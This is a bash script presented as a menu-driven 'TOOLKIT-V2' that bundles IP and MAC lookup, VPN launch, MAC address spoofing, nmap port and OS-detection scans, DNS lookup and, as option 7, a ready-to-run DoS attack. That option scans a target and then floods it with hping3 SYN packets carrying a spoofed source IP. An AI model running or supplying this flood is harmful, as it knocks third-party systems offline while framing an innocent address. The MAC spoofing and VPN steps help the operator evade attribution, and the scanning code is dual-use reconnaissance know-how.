#!/bin/bash

CYAN='\e[34m'
WHITE='\e[37m'
GREEN='\e[32m'
RED='\e[31m'
NC='\e[0m'


echo -e "${GREEN}- - -              \\   /"
echo -e "${GREEN}|    \\ / |\\ |  /\\   \\ /"
echo -e "${GREEN}|     |  | \\| /--\\  / \\" 
echo -e "${GREEN}- - -              /   \\   ${RED}TOOLKIT-V2${NC}"
echo -e "${CYAN}Choose Option :${NC}"
echo "(-1-)Show My Ip"
echo "(-2-)Show My Mac Address"
echo "(-3-)Run VPN"
echo "(-4-)Change Mac Addresss"
echo "(-5-)Port Scanning"
echo "(-6-)DNS Resolve"
echo "(-7-)DOS Attack"
read opt
case $opt in
	1)
		echo -n "Private IP = "
		hostname -I | awk '{print $1}'
		echo "Public IP ="
		curl ifconfig.me
		;;
	2)
		echo "Mac Address= "
		ifconfig eth0 | grep -Po 'ether \K.*$'
		;;
	3)
		echo "Starting VPN..."
		echo "Choose Country :"
		openpyn -l
		read cr
		openpyn $cr
		;;
	4)
		echo "Changing Mac Address"
		echo "(-1-)New Mac Address Of Choice?"
		echo "(-2-)Change Mac Address Randomly"
		read chh
		case $chh in
			1)
				echo "Enter New Mac Address In This Pattern: (XX:XX:XX:XX:XX:XX)"
				read mac
				macchanger -m $mac eth0
				;;
			2)
				macchanger -r eth0
				;;
			*)
				echo "Unknown"
				;;
				esac
		;;
	5) 
		echo "Port Scanning"
		echo "Enter IP Address"
		read ip
		echo "Which Type Of Scan Do You Want To Perform ?"
		echo "-1-Quick Scan (Faster Then Normal)"
		echo "-2-Scan Specific Port"
		echo "-3-Scan Most Popular Ports"
		echo "-4-Scan + OS and service detection with fast execution"
		echo "-5-Save Your NMAP Scan To A File"
		read nch
		case $nch in
			1)
				echo "Running Quick Scan..."
				nmap -T4 -F $ip
				;;
			2)
				echo "Enter Port That You Want To Scan : "
				read port
				nmap -p $port $ip
				;;
			3)
				echo "Scanning Most Popular Ports..."
				nmap --top-ports 20 $ip
				;;
			4)
				echo "Performing OS-Detection Scan..."
				nmap -A -T4 $ip
				;;
			5)
				echo "Saving NMAP Report To A File :"
				echo "Enter Name Of File With Extension (Test.txt)"
				read fn
				nmap -oN $fn $ip
				;;
			*)
			 	echo "Unknown..."
			 	;; 
		esac
		;;
	6)
		echo "Enter Domain Name Server (DNS) To Find Its IP :"
		read dns
		nslookup $dns
		;;
	7)
		echo -e "${RED}--DOS Attack--${NC}"
		echo "Enter Target IP :"
		read tip
		echo "Enter IP That You Want To Spoof :"
		read sip
		echo -e "${RED}Starting NMAP To Scan Open Ports...${NC}"
		nmap --top-ports 20 $tip
		echo "Choose Open Port (If Any) :"
		read tport
		echo -e "${RED}Starting DOS Attack 3..2..1${NC}"
		hping3 -S $tip -a $sip -p $tport --flood
		;;
	*)
		echo "Unknown"
		;;
esac
